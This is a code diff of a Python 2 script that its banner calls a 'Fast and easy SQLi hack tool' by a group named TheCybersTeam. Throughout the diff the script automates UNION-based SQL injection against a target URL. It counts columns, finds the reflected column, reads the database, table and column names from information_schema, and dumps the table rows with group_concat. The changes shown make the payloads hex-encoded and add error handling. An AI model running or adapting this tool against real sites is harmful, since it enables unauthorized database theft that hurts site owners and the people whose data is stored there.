@@ -1,7 +1,6 @@
 # Facebook: https://www.facebook.com/TheCybersTeam
 # Group:    https://www.facebook.com/groups/TheCybersTeam
 # Channel:  https://www.youtube.com/channel/UCKFMv1cifW55lKKps2thhbw
-# Greatz:   quintanilhaedu
 
 import urllib as cybers
 import sys
@@ -15,15 +14,16 @@ if platform.system() == "Windows":
     clear = "cls"
 os.system(str(clear))
 
-print " _____ _              ___      _                     _____                     "
-print "/__   \ |__   ___    / __\   _| |__   ___ _ __ ___  /__   \___  __ _ _ __ ___  "
-print "  / /\/ '_ \ / _ \  / / | | | | '_ \ / _ \ '__/ __|   / /\/ _ \/ _` | '_ ` _ \ "
-print " / /  | | | |  __/ / /__| |_| | |_) |  __/ |  \__ \  / / |  __/ (_| | | | | | |"
-print " \/   |_| |_|\___| \____/\__, |_.__/ \___|_|  |___/  \/   \___|\__,_|_| |_| |_|"
-print "                         |___/                                                 Beta 1.9"
-print ""
-print "More: https://www.facebook.com/TheCybersTeam"
-print "Fast and easy SQLi hack tool"
+"""
+_____ _              ___      _                     _____                    
+/__   \ |__   ___    / __\   _| |__   ___ _ __ ___  /__   \___  __ _ _ __ ___  
+  / /\/ '_ \ / _ \  / / | | | | '_ \ / _ \ '__/ __|   / /\/ _ \/ _` | '_ ` _ \ 
+ / /  | | | |  __/ / /__| |_| | |_) |  __/ |  \__ \  / / |  __/ (_| | | | | | |
+ \/   |_| |_|\___| \____/\__, |_.__/ \___|_|  |___/  \/   \___|\__,_|_| |_| |_|
+                         |___/                                                 Beta 2.0
+More: https://www.facebook.com/TheCybersTeam"
+Fast and easy SQLi hack tool"
+"""
 
 class Sqli:
     url = None
@@ -31,6 +31,7 @@ class Sqli:
     columns = None
     dbs = []
     build = ["", ""]
+    key = "0x5468334379623372735433346d"
     def setUrl(self):
         for k, v in enumerate(sys.argv):
             if v == "--url":
@@ -57,36 +58,34 @@ class Sqli:
         return res.read() 
 
     def setColumns(self):
-        key = "Th3Cyb3rsT34m"
         print "Start Count Columns..."
-        url = self.url + "-1 union select "
+        url = self.url + "0x2d31+union+select+"
         start = 1
         finish = 50
         for i in range(start,finish):
             sys.stdout.write("\rColumns Total: {0}".format(i))
             if i != start and i != finish:
                 url+=", "
-            url+="'"+key+"'"
+            url+=self.key
             res = self.getContent(url)
-            if res.find(key) !=-1:
-                self.columns = i
-                return
+            if res.find("union select") ==-1:
+                if res.find("Th3Cyb3rsT34m") !=-1:
+                    self.columns = i
+                    return    
         self.columns = 0
 
     def setVulCol(self):
-        key = "Th3Cyb3rsT34m"
-        inject = "666Th3Cyb3rsTeam666"
         for i in range(1, self.columns+1):
-            line = "-1 union select "
+            line = "0x2d31+union+select+"
             for j in range(1, self.columns+1):
                 if j != 1 and j != self.columns+1:
                     line = line + ", "
                 if i == j:
-                    line+="'"+inject+"'"
+                    line+="'"+self.key+"'"
                 else:
-                    line+="'"+key+"'"
+                    line+="'"+str(j)+"'"
             res = self.getContent(self.url + line)
-            if res.find(inject) !=-1:
+            if res.find(self.key) !=-1:
                 self.vulCol = i
                 return
         self.vulCol = 0
@@ -99,34 +98,43 @@ class Sqli:
         if(pos != -1):      
             ini = content[pos+2:]
             pos = ini.find("#'")
-            return ini[:pos]
+            if(pos !=-1):
+                return ini[:pos]
+            else:
+                print "*ERROR*: Not found!\n"
+                exit()
 
     def getDatabase(self):
-        self.build = [self.url + "-1 union select ", ""]
+        self.build = [self.url + "0x2d31+union+select+", ""]
         line = ""
         side = 0
         for i in range(1, self.columns+1):
             if i != 1 and i != self.columns+1:
-                line=", "
+                line=","
             if side == 0:
                 if i != self.vulCol:
                     self.build[side]+=line+str(i)
                     line+= str(i) 
                 else:
+                    if i !=1:
+                        self.build[side]+=","
                     side = 1
             else:
                 self.build[side]+=line+str(i)
-        url = self.build[0] + self.getConcat("database()") + self.build[1]
+
+
+        url = self.build[0]+self.getConcat("database()")+self.build[1]
         res = self.getContent(url)
         return self.getVars(res)
 
     def getTables(self,database):
-        url = self.build[0] + self.getConcat("table_name") + self.build[1] + " from+information_schema.tables where table_schema='"+database+"'"
+
+        url = self.build[0]+self.getConcat("table_name")+self.build[1]+"+from+information_schema.tables+where+table_schema='"+database+"'"
         res = self.getContent(url)
         return self.getVars(res)
 
     def getColumns(self,table,database):
-        url = self.build[0] + self.getConcat("column_name") + self.build[1] + " from+information_schema.columns where table_name='"+table+"'"
+        url = self.build[0]+self.getConcat("column_name")+self.build[1]+"+from+information_schema.columns+where+table_name='"+table+"'"
         res = self.getContent(url)
         return self.getVars(res)
 
@@ -142,10 +150,13 @@ class Sqli:
                 line+=",0x3a,"
             line+=name
             i+=1
-        url = self.build[0] + "concat(0x27,0x23,group_concat("+line+"),0x23,0x27)" + self.build[1]+ " from+"+table
+        url = self.build[0]+"concat(0x27,0x23,group_concat("+line+"),0x23,0x27)"+self.build[1]+"+from+"+table
         res = self.getContent(url)
         data = self.getVars(res)
-        rows = data.split(",")
+        try:
+            rows = data.split(",")
+        except:
+            print "*ERROR*: Not found!\n"
         vector = []
         for j in rows:
             i=0
@@ -153,8 +164,8 @@ class Sqli:
             temp = []
             for k in col:
                 temp.append(k)
-                if len(k) > space[i]:
-                    space[i] = len(k)
+                if len(k)>space[i]:
+                    space[i]=len(k)
                 i=i+1
             vector.append(temp)
         self.dbs[0].tables[0].setDatas(vector)
@@ -198,6 +209,7 @@ class Tb:
 
 s = Sqli()
 s.setUrl()
+
 s.setColumns()
 s.setVulCol()
 print "\nVul Column: " +str(s.vulCol)
